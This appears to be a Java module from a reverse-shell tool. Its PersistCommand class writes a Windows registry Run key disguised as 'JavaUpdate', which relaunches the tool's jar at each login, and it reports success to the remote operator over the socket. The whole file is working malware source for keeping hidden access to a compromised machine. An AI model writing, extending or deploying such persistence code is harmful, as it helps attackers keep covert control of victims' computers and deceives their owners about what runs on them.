package reverse_shell.modules;

import reverse_shell.CommandHandler;

import java.io.File;
import java.io.OutputStream;
import java.net.Socket;

public class PersistCommand implements CommandHandler {

    @Override
    public void handle(String[] args, Socket socket) throws Exception {
        String javaPath = "\"C:\\Program Files\\Eclipse Adoptium\\jdk-21.0.7.6-hotspot\\bin\\java.exe\"";
        String jarPath = new File(PersistCommand.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath();

        // Назва ключа реєстру
        String regName = "JavaUpdate";

        // Побудова команди для запису в реєстр
        String command = String.format("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %s /t REG_SZ /d \"%s -jar %s\" /f",
                regName, javaPath, jarPath);

        Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
        process.waitFor();

        OutputStream output = socket.getOutputStream();
        output.write("[+] Persistence added.\n".getBytes());
    }
}